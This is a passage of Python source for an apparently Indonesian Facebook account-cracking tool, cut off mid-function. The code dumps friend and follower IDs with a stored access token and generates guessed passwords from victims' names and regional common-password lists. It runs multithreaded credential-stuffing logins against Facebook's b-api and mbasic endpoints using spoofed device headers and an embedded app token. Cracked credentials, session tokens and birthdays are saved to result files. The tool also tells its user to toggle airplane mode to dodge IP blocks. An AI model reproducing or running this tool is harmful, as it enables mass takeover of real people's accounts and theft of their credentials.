			dump = open('dump/'+filex+'.json','w') 
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i['id']
				nm = i['name']
				id.append(uid+'<=>'+nm)
				dump.write(uid+'<=>'+nm+'\n')
			dump.close()
			print(("\n\r"+war+"Total ID : %s%s"%(I,str(len(id)))), end=' ');sys.stdout.flush()
		except KeyError:
			pass
	except KeyError:
		pass
	print(("\n\r"+war+"Total ALL ID: %s%s"%(I,str(len(id)))), end=' ');sys.stdout.flush()
	print("\n"+war+"Dump Results Saved In : "+I+"dump/"+filex+".json")
	input(war+'Press enter !!\n\n\n\n')
	menu()
def follow():
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	id = []
	try: 
		print ("\n"+war+"Fill In 'me' If You Want From Your Own Followers")
		idt = input(bulat+"ID Follow : "+I)
		if idt in [""," "]:
			print(war+"Don't Empty!!")
			time.sleep(1)
			follow()
		filex = input("\n"+bulat+"File Name : "+C)
		if filex in [""," "]:
			filex = ('Mr.Risky')
		else:
			pass
		limit = input(war+"Limit : "+C)
		if limit == "" or limit == " ":
			limit = "5000"
		print(war+"Wait a moment Checking ID !!");time.sleep(0.05)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			op = json.loads(pok.text)
			print (bulat+"Name : "+sp["name"])
		except KeyError:
			jalan(war+"Sorry Idz Target Not Published !!")
			pass
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token)
		try:
			dump = open('dump/'+filex+'.json','w') 
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i['id']
				nm = i['name']
				id.append(uid+'<=>'+nm)
				dump.write(uid+'<=>'+nm+'\n')
			dump.close()
		except KeyError:
			pass
	except KeyError:
		pass
	print(("\n\r"+war+"Total : %s%s"%(I,str(len(id)))), end=' ');sys.stdout.flush()
	print("\n"+war+"Dump Results Saved In : "+I+"dump/"+filex+".json")
	input(war+'Press enter !!\n\n\n')
	menu()
# Enc Dump


# Menu Crack
def pilihcrack(file):
	if os.path.exists('.prem'):
		license()
		status_prem=(f"{i}Yes")
		tesz='\033[0;92m'
		paa = ("")
		pass
	else:
		status_prem=(f"{m}Not")
		paa = (C+"("+M+" PREMIUM "+C+")")
		tesz='\033[0;91m'
#	if os.path.exists('.admin'):
#		license2()
#		status_admin=(f"{i}Yes")
#		teszz='\033[0;92m'
#		pass
#	else:
#		status_admin=(f"{m}Not")
#		teszz='\033[0;91m'
#	if os.path.exists('.free'):
#		license3()
#		status_free=(f"{i}Yes")
#		teszzz='\033[0;92m'
#		paa = ("")
#		pass
#	else:
#		status_free=(f"{m}Not")
#		paa = (C+"("+M+" PREMIUM "+C+")")
#		teszzz='\033[0;91m'
	print("\n"+k+"["+p+"01"+k+"]"+p+" B-Api V1 "),time.sleep(0.03)
	print(k+"["+p+"02"+k+"]"+p+" B-Api V2 "),time.sleep(0.03)
	print(k+"["+p+"03"+k+"]"+p+" B-Api V2.2 "),time.sleep(0.03)
	print(k+"["+p+"04"+k+"]"+p+" B-Api V3 "),time.sleep(0.03)
	print(k+"["+p+"05"+k+"]"+p+" B-Api V3 + Opsi "+paa),time.sleep(0.03)
	print(k+"["+p+"06"+k+"]"+p+" Mbasic V1 "),time.sleep(0.03)
	print(k+"["+p+"07"+k+"]"+p+" Mbasic V2 "),time.sleep(0.03)
	print(k+"["+p+"08"+k+"]"+p+" Mbasic V2 + Opsi "+paa),time.sleep(0.03)
	print(k+"["+p+"09"+k+"]"+p+" Free Facebook V1 "),time.sleep(0.03)
	print(k+"["+p+"10"+k+"]"+p+" Free Facebook V2 "),time.sleep(0.03)
	print(k+"["+p+"11"+k+"]"+p+" FAST CRACK +++"),time.sleep(0.03)
	q = input("\n"+war+"Choose : "+I)
	if q in [""," "]:
		jalan(war+"Don't Empty !!")
		pilihcrack(file)
	elif q == "1" or q == "01" :
		bapi(file)
	elif q == "2" or q == "02" :
		crackmenu(file).passmenu(file)
	elif q == "3" or q == "03" :
		crackmeu(file).passmenu(file)
	elif q == "4" or q == "04" :
		bapio_free(file)
	elif q == "5" or q == "05" :
		if paa == "" or paa == " ":
			bapio_vvip(file)
		else:
			jalan(war+"Sorry you are not a premium user !!")
			time.sleep(1)
			pilihcrack(file)
	elif q == "6" or q == "06" :
		crack2(file)
	elif q == "7" or q == "07" :
		crack_new_free(file)
	elif q == "8" or q == "08" :
		if paa == "" or paa == " ":
			crack_new_vvip(file)
		else:
			jalan(war+"Sorry you are not a premium user !!")
			time.sleep(1)
			pilihcrack(file)
	elif q == "9" or q == "09" :
		crackffb(file)
	elif q == "10" or q == "10" :
		grap(file)
	elif q == "11" or q == "11" :
		kontol(file).passmenu(file)
	else:
		jalan(war+"Fill Correctly !!")
		pilihcrack(file)


def generate(text):
	results=[]
	try:
		ct = open('.pass.txt', 'r').read()
	except:pass
#	try:
#		vt = open(".passs.txt", "r").read()
#		pw1, pw2, pw3, pw4 = vt.split(",")
#		results.append(pw1)
#		results.append(pw2)
#		results.append(pw3)
#		results.append(pw4)
#	except:
#		try:
#			pw1, pw2, pw3 = vt.split(",")
#			results.append(pw1)
#			results.append(pw2)
#			results.append(pw3)
#		except:
#			try:
#				pw1, pw2 = vt.split(",")
#				results.append(pw1)
#				results.append(pw2)
#			except:
#				try:
#					pw1 = vt.split(",")
#					results.append(pw1)
#				except:pass
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			ii=text.lower()
			iii, iiii = text.split(" ")
			zs = iii
			sz = iiii
			iii = iii.lower()
			iiii = iiii.lower()
			iiiii = iii+iiii.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(iiii+"123")
				results.append(iiii+"12345")
#				results.append(zs+"123")
#				results.append(zs+"12345")
#				results.append(sz+"123")
#				results.append(sz+"12345")
#				results.append(iiii+"1234")
#				results.append(iii+iiii)
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(ii)
#				results.append(iii+iiii)
				if "id" in ct:
					results.append("sayang")
					results.append("anjing")
					results.append("bismillah")
					results.append("kontol")
				elif "bd" in ct:
					results.append("786786")
					results.append("000786")
					results.append("102030")
					results.append("556677")
				elif "pk" in ct:
					results.append("pakistan")
					results.append("786786")
					results.append("000786")
				elif "us" in ct:
					results.append("123456")
					results.append("qwerty")
					results.append("iloveyou")
					results.append("passwords")
				elif "all" in ct:
					results.append("kontol")
					results.append("sayang")
					results.append("sayangku")
					results.append("bismillah")
					results.append("indonesia")
					results.append("bajingan")
					results.append("bangsat")
					results.append("katasandi")
					results.append("123456")
					results.append("rahasia")
#					results.append("12345678")
#					results.append("123456789")
				elif "old" in ct:
					results.append("123456")
					results.append("sayang")
					results.append("rahasia")
#					results.append("1234567")
#					results.append("12345678")
#					results.append("123456789")
					results.append("bismillah")
				else:
					pass
	return results
def add_pw():
	print(war+"Enter Additional Password Example : "+C+"sayang,102030,123456")
	print(inp+"Use *,* for password separator, Example: 102030,123456")
	time.sleep(1)
	na = input(inp+"Password : "+I)
	while len(na) < 6:
		print(war+"Sorry Password Minimum 6 Letters Or Words")
		time.sleep(1)
		add_pw()
	if na == "" or na == " ":
		print(war+"Please Fill Correctly"), time.sleep(1)
		add_pw()
	else:
		ppx=open(".passs.txt", "w")
		ppx.write(na)
		ppx.close()
def pilih_pw():
	try:
		os.remove(".passs.txt")
	except:pass
#	add_pw()
	print(war+"Please Choose Password.."), time.sleep(2)
	print("\n"+C+"["+K+"1"+C+"]"+K+" Name123 + Name1234 + Name12345 + Full name ")
	print(C+"["+K+"2"+C+"]"+K+" India/Bangladesh")
	print(C+"["+K+"3"+C+"]"+K+" Pakistan")
	print(C+"["+K+"4"+C+"]"+K+" United States")
	print(C+"["+K+"5"+C+"]"+K+" Indonesia")
	print(C+"["+K+"6"+C+"]"+K+" Old Passwords")
	print(C+"["+K+"7"+C+"]"+K+" All Passwords From Indonesia")
	njj = input("\n"+inp+"Language : "+I)
	if njj in [""," "]:
		print(war+"Please Fill Correctly"), time.sleep(1)
		pilih_pw()
	elif njj in ["1","01"]:
		ppx=open(".pass.txt", "w")
		ppx.write("none")
		ppx.close()
	elif njj in ["2","02"]:
		ppx=open(".pass.txt", "w")
		ppx.write("bd")
		ppx.close()
	elif njj in ["3","03"]:
		ppx=open(".pass.txt", "w")
		ppx.write("pk")
		ppx.close()
	elif njj in ["4","04"]:
		ppx=open(".pass.txt", "w")
		ppx.write("us")
		ppx.close()
	elif njj in ["5","05"]:
		ppx=open(".pass.txt", "w")
		ppx.write("id")
		ppx.close()
	elif njj in ["6","06"]:
		ppx=open(".pass.txt", "w")
		ppx.write("old")
		ppx.close()
	elif njj in ["7","07"]:
		ppx=open(".pass.txt", "w")
		ppx.write("all")
		ppx.close()
	else:
		print(war+"Please Fill Correctly"), time.sleep(1)
		pilih_pw()
def log_api(em,pas,hosts):
    global ua
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'json',
        'sdk_version': '2',
        'email': em,
        'locale': 'en_US',
        'password': pas,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}

    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def graph(em,pas,hosts):
	global ua
	graph_h={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua_me,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	r=requests.Session()
	r.headers.update(graph_h)
	p=r.get("https://graph.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	dtg="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":dtg,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://graph.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://graph.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def mbasic2(em,pas,hosts):
	ua_dua = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54"])
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua_dua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class kontol:

	def __init__(self,isifile):
		self.id = []
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
	def passmenu(self,isifile):
		try:
			self.apk = isifile
			self.id = open(self.apk).read().splitlines()
		except:
			print(war+'File Not Found! Try Again')
			time.sleep(2)
			menu()
		print('\n\n'+war+'Do you want to use manual password? '+K+'['+M+'y'+q+'/'+I+'n'+K+']')
		zk = input(inp+'Choose An Option : ')
		if zk in ('y','Y'):
			while True:
				pwx = input('\n'+inp+"Enter Manual Password : ")
				jalan("%sThe Password You Use : %s%s"%(war,I,pwx))
				if pwx == '':
					jalan(war+"Please Enter Password !!")
				elif len(pwx)<=5:
					jalan(war+"Password Minimum 6 Letters !!")
				else:
					jalan("\n\n"+war+"Turn On Airplane Mode, For 5 Seconds, Then Turn It Off\n"+war+"Ok Crack Results Saved In : "+I+"Hasil/OK-"+durasi+".txt\n"+war+"Cp Crack Results Stored In : "+K+"Hasil/CP-"+durasi+".txt\n\n")
					print(war+"Crack Start Hours : "+C+durasi+I+"  "+K+jamz+"\n\n")
				def zkth(zsc=None):
					with zthreads(max_workers=30) as (form):
						for uid in self.id:
							try:
								userid = uid.split('<=>')[0]
								form.submit(self.api_f, userid, zsc)
							except: pass
				os.remove(self.apk)
				zkth(pwx.split(','))
				break
		elif zk in ('n', 'N'):
			pilih_pw()
			jalan("\n\n"+war+"Turn On Airplane Mode, For 5 Seconds, Then Turn It Off\n"+war+"Ok Crack Results Saved In : "+I+"Hasil/OK-"+durasi+".txt\n"+war+"Cp Crack Results Stored In : "+K+"Hasil/CP-"+durasi+".txt\n\n")
			print(war+"Crack Start Hours : "+C+durasi+I+"  "+K+jamz+"\n\n")
			self.passwords()

		else:
			print(war+'Wrong Input! Try Again')
			time.sleep(2)
			kontol().passmenu()
			return

	def passwords(self):
		with zthreads(max_workers=30) as (form):
			for uname in self.id:
				try:
					zz = uname.split('<=>')
					form.submit(self.api_f,zz[0], generate(uname.split("<=>")[1]))
				except:
					pass
			os.remove(self.apk)
			exit("\n\n"+war+"Crack Done...")


	def api_f(self, uid, pwx):
		global ua
#		ua = random.choice([
#			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
#			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
#		])
		sys.stdout.write(
			"\r [Crack] %s/%s [OK : %s] [CP : %s] "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r "+Q+"["+I+"CP"+Q+"]"+I+" %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(uid, pw))
				bokep_japan_yang_terbaru("OK", uid, pw, "-")
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				try:
					token = open("login.txt").read()
					toket = open("login.txt").read()
					jok = requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
					op = json.loads(jok.text)
					ttll = op['birthday']
				except (KeyError, IOError):
					ttll = (' ')
				print("\r "+Q+"["+K+"CP"+Q+"]"+K+" %s|%s|%s\033[0;97m         "%(uid, pw, ttll))
				self.cp.append("%s|%s"%(uid, pw))
				bokep_japan_yang_terbaru("CP", uid, pw, ttll)
				open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
class crackmeu:

    def __init__(self,isifile):
        self.id = []
    def passmenu(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        print('\n\n'+war+'Do you want to use manual password? '+K+'['+M+'y'+q+'/'+I+'n'+K+']')
        zk = input(inp+'Choose An Option : ')
        if zk in ('y','Y'):
            while True:
                pwx = input('\n'+inp+"Enter Manual Password : ")
                jalan("%sThe Password You Use : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Please Enter Password !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimum 6 Letters !!")
                else:
                    jalan("\n\n"+war+"Turn On Airplane Mode, For 5 Seconds, Then Turn It Off\n"+war+"Ok Crack Results Saved In : "+I+"Hasil/OK-"+durasi+".txt\n"+war+"Cp Crack Results Stored In : "+K+"Hasil/CP-"+durasi+".txt\n\n")
                    print(war+"Crack Start Hours : "+C+durasi+I+"  "+K+jamz+"\n\n")
                    def zkth(zsc=None):
                    	with zthreads(max_workers=30) as (form):
                    		for uid in self.id:
                    			try:
                    				userid = uid.split('<=>')[0]
                    				form.submit(self.api__, userid, zsc)
                    			except: pass
                    	os.remove(self.apk)
                    zkth(pwx.split(','))
                    break
        elif zk in ('n', 'N'):
	        pilih_pw()
	        jalan("\n\n"+war+"Turn On Airplane Mode, For 5 Seconds, Then Turn It Off\n"+war+"Ok Crack Results Saved In : "+I+"Hasil/OK-"+durasi+".txt\n"+war+"Cp Crack Results Stored In : "+K+"Hasil/CP-"+durasi+".txt\n\n")
	        print(war+"Crack Start Hours : "+C+durasi+I+"  "+K+jamz+"\n\n")
	        self.passwords()

        else:
            print(war+'Wrong Input! Try Again')
            time.sleep(2)
            crackmenu().passmenu()
        return

    def passwords(self):
            with zthreads(max_workers=25) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
#                        if len(xz)>=5:
 #                           pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]+' '+xz[4]]
  #                      elif len(xz) <= 1:
   #                         pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]]
    #                    elif len(xz) <= 2:
     #                       pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]]
      #                  elif len(xz) <= 3:
       #                     pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]]
        #                elif len(xz) <= 4:
         #                   pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]]
          #              else:
           #                 pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[1]+"123",xz[1]+"12345"]
                        form.submit(self.api__,zz[0], generate(uname.split("<=>")[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Done...")
    def api__(self, user, zona):
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
                loop +=1
                print("P")
                print ("\r"+war+"Sorry, your IP address is spam, please turn it on and off airplane mode"),
                sys.stdout.flush()
                api__(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                ok_r = ('\r %s[%sOK%s]%s %s|%s|%s ' % (Q,I,Q,I,user,pw,response.json()['access_token']))
                print (ok_r)
                ok.append(ok_r)
                bokep_japan_yang_terbaru("OK", user, pw, response.json()['access_token'])
                open('Hasil/OK-%s.txt' % (durasi), 'a+').write("%s|%s|%s\n"%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('login.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    cp_r = ('\r %s[%sCP%s]%s %s|%s|%s            ' % (Q,K,Q,K,user,pw,lahir))
                    bokep_japan_yang_terbaru("CP", user, pw, lahir)
                    print (cp_r)
                    cp.append(cp_r)
                    open('Hasil/CP-%s.txt' % (durasi), 'a+').write("%s|%s|%s\n"%(user,pw,lahir))
                    break
                except KeyError:
                     pass
                except: pass
                cp_r = ('\r %s[%sCP%s]%s %s|%s           ' % (Q,K,Q,K,user,pw))
                print (cp_r)
                cp.append(cp_r)
                bokep_japan_yang_terbaru("CP", user, pw, "-")
                open('Hasil/CP-%s.txt' % (durasi), 'a+').write("%s|%s\n"%(user,pw))
                break
                continue
        loop += 1
        print('\r [%s] %s/%s [OK : %s] [CP : %s]'%(response.status_code,loop,len(self.id),len(ok),len(cp)),end=' ');sys.stdout.flush()
#        print(("\r\x1b[0;33m[\x1b[0;37m%s\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(response.status_code,self.ko,len(self.id),len(ok),len(cp))), end=' ');sys.stdout.flush()
class bapio_vvip:
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			pilih_pw()
			f=input(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p+" : "))
			if f=="":continue
			elif f=="y" or f=="Y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'Problem Not Found')
					continue
				print(bulat+'Password Example : sayang,anjing')
				self.pwlist()
				break
			elif f=="n" or f=="N":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
				print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
				try:
